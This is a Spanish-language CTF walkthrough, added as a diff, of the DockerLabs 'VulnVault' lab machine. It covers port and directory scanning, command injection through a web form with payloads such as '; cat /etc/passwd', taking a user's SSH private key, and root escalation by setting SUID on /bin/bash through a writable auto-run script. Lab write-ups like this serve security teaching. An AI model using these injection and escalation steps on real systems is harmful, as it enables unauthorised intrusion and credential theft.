@@ -1,0 +1,216 @@
+---
+title: VulnVault
+description: Resolución completa de la máquina virtual *VulnVault* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **VulnVault**, desarrollada por *d1se0* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor web con un formulario vulnerable a **inyección de comandos** mediante la ejecución de código PHP ofuscado. Tras bypassar la ofuscación, se obtiene ejecución remota de comandos como `www-data`, permitiendo leer archivos del sistema y extraer la clave privada SSH del usuario `samara`.
+Con la clave, se accede al sistema vía SSH. Una vez dentro, se identifica un script `echo.sh` que se ejecuta automáticamente y es modificable por el usuario, permitiendo establecer el bit SUID en `/bin/bash` y obtener acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'VulnVault',
+    Autor: 'd1se0',
+    Dificultad: 'Fácil',
+    Fecha: '25/08/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip VulnVault.zip
+sudo bash auto_deploy.sh VulnVault.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p VulnVault/{content,exploits,nmap,scripts}
+cd VulnVault
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1755058209/Ports_ppjkpo.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1755058205/Gobuster_j3mqsn.png)
+
+**Rutas encontradas:**
+- `Index` — Página principal con formulario.
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1755058207/Index_ol0qcd.png)
+- `Upload.php` — Lista de reportes.
+  ![Upload.php](https://res.cloudinary.com/dewqswzke/image/upload/v1755058202/Upload.php_vmsi6z.png)
+- `Upload.html` — Formulario de subida.
+  ![Upload.html](https://res.cloudinary.com/dewqswzke/image/upload/v1755058201/Upload.html_rrwimh.png)
+- `Upload.js` y `scripts.js` — Código JavaScript.
+  ![Upload.js](https://res.cloudinary.com/dewqswzke/image/upload/v1755058202/Upload.js_raqyo3.png)
+- `/old` — Versión antigua del sitio.
+  ![Old](https://res.cloudinary.com/dewqswzke/image/upload/v1755058208/Old_gorm6e.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Inyección de comandos
+
+El formulario principal permite procesar datos en el backend. Se prueba una inyección de comandos PHP:
+
+```php
+<?php system(id)
+```
+
+La ofuscación falla. Se añade un `;` al final para ejecutar correctamente:
+
+```php
+; whoami
+```
+
+![Escape](https://res.cloudinary.com/dewqswzke/image/upload/v1755058205/Escape_ftz8ze.png)
+
+### 2.2 Enumeración del sistema
+
+Se lee `/etc/passwd`:
+
+```bash
+; cat /etc/passwd
+```
+
+![Passwd](https://res.cloudinary.com/dewqswzke/image/upload/v1755058209/Passwd_bgbjw7.png)
+
+Se explora el home de `samara` y se encuentra la clave privada SSH en `.ssh`:
+
+![RSA](https://res.cloudinary.com/dewqswzke/image/upload/v1755058200/Rsa_ffmcm4.png)
+
+### 2.3 Acceso SSH
+
+Se guarda la clave con permisos adecuados:
+
+```bash
+chmod 600 id_rsa
+ssh -i id_rsa samara@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1755058200/SSH_hxzegu.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De samara → root
+
+No hay permisos sudo ni binarios SUID útiles inicialmente. Se enumeran procesos:
+
+```bash
+ps aux
+```
+
+![Ps](https://res.cloudinary.com/dewqswzke/image/upload/v1755058210/Ps_khrvqb.png)
+
+Se identifica que se ejecuta:
+
+```
+/bin/bash /usr/local/bin/echo.sh
+```
+
+El script es modificable. Se modifica para establecer el bit SUID en `/bin/bash`:
+
+```bash
+chmod u+s /bin/bash
+```
+
+![Chmod](https://res.cloudinary.com/dewqswzke/image/upload/v1755058203/Chmod_c6zub9.png)
+
+Tras la ejecución del script, se obtiene una shell con privilegios de root:
+
+```bash
+/bin/bash -p
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1755058199/Root_ogfv6u.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Inyección de comandos en formulario web",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como www-data"
+    },
+    {
+      vulnerability: "Clave privada SSH expuesta en directorio accesible",
+      severity: "Crítica",
+      impact: "Acceso SSH al sistema"
+    },
+    {
+      vulnerability: "Script ejecutado automáticamente y modificable por samara",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    }
+  ]}
+/>
